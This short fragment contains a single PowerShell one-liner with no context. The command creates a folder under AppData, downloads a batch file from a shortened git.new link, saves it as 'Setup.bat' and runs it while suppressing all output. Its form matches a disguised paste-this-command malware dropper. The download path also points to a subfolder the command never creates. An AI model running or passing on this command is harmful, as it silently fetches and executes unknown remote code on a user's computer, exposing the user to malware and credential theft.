...
```
powershell -c "cls;md $env:AppData\Utilities -f;iwr https://git.new/zhV1D2s -o $env:AppData\Utilities\Setup\Setup.bat;start $env:AppData\Utilities\Setup\Setup.bat" >$null 2>&1
```
